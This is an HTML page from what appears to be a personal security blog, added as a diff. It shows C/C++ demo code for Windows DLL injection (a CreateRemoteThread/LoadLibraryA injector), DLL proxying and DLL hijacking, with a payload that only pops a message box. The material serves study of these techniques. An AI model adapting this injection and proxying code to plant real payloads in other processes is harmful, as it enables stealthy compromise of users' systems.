@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Source DLL</title>
+    <link rel="stylesheet" href="../style.css">
+    <script src="../highlight.js"></script>
+    <script src="../languages.js"></script>
+    <script>
+        hljs.highlightAll();
+    </script>
+</head>
+<body>
+    <h1 style="text-align: left;">
+        <a href="../index.html" style="text-decoration: none; color: grey;">KhoaLeDang's Blog</a>
+    </h1>
+    <p>
+        <a href="../Dlls.html">Go back to Dll</a>
+    </p>
+    <h1>payload.dll </h1>
+        <pre class="codeblock">
+            <code class="language-cpp">
+                #include "pch.h"
+                BOOL APIENTRY DllMain( HMODULE hModule,
+                                       DWORD  ul_reason_for_call,
+                                       LPVOID lpReserved
+                                     )
+                {
+                    switch (ul_reason_for_call)
+                    {
+                    case DLL_PROCESS_ATTACH:
+                        MessageBoxA(NULL, "Hi, I'm payload.dll", "DLL INJECTED!", MB_OK);
+                        break;
+                    case DLL_THREAD_ATTACH:
+                    case DLL_THREAD_DETACH:
+                    case DLL_PROCESS_DETACH:
+                        break;
+                    }
+                    return TRUE;
+                }                
+        </code>
+        </pre>
+        <h1>victim_dll (DLL_PROXING)</h1>
+        <pre class="codeblock">
+            <code class="language-cpp">
+                // dllmain.cpp : Defines the entry point for the DLL application.
+#include "pch.h"
+#define DECLEXPORT __declspec(dllexport)
+#ifdef __cplusplus
+extern "C" {
+#endif // __cplusplus
+    DECLEXPORT int Add(int a, int b) {
+        return a + b;
+    }
+}
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+            </code>
+        </pre>
+        <h1>payload_dll (DLL_PROXYING)</h1>
+        <pre class="codeblock">
+            <code class="language-cpp">
+                // dllmain.cpp : Defines the entry point for the DLL application.
+#include "pch.h"
+#pragma comment(linker, "/export:Add=victim_source_dll.Add")
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        MessageBoxA(NULL, "Hi, I'm payload.dll", "DLL INJECTED!", MB_OK);
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+            </code>
+        </pre>
+    <h1>victim.c (DLL HIJACKING)</h1>
+    <pre class="codeblock">
+        <code class="language-cpp">
+            #include &lt;Windows.h&gt;
+            #include &ltstdio.h&gt;
+            int main() {
+                HMODULE library_module = NULL;
+                library_module	 = LoadLibraryA("payload.dll");
+                if (library_module == NULL)
+                {
+                    printf("\nFAILED TO LOAD payload.dll");
+                    return 1;
+                }
+                return 0;
+            }
+        </code>
+</pre>
+<h1>injector.c (DLL injection)</h1>
+<pre class="codeblock">
+    <code class="language-cpp">
+        #include &lt;windows.h&gt;
+            #include &lt;stdio.h&gt;
+            int main() {
+                HANDLE process_handle = INVALID_HANDLE_VALUE;
+                DWORD pid = 1053;
+                LPVOID dll_path_inside_victim = NULL;
+                size_t bytes_written = 0;
+                const char dll_path[] = "C:\\Users\\kingx\\source\\repos\\victim\\x64\\Debug\\payload.dll";
+                
+                process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
+                dll_path_inside_victim = VirtualAllocEx(process_handle, 0, sizeof(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                WriteProcessMemory(process_handle, dll_path_inside_victim, dll_path, sizeof(dll_path), &bytes_written);
+                    if ((CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dll_path_inside_victim, 0, NULL))== NULL) {
+                        printf("FAILED TO CREATE REMOTE_THREAD");
+                        return 1;
+                    }
+                    return 0;
+            }
+    </code>
+</pre>
+<h1>victim.c (DLL_PROXYING)</h1>
+<pre class="codeblock">
+    <code class="language-cpp">
+        #include &lt;Windows.h&gt;
+            #include &lt;stdio.h&gt;
+            typedef int (*func)(int a, int b);
+            int main() {
+                printf("Hello I'm Victim.exe\n");
+                func p_Add = NULL;
+                int sum = 0;
+                HMODULE victim_base = LoadLibraryA("victim_dll");
+                p_Add = (func)GetProcAddress(victim_base, "Add");
+                sum = p_Add(1, 2);
+                printf("Sum is %d", sum);
+                FreeLibrary(victim_base);
+                return 0;
+            }
+    </code>
+</pre>
+</body>
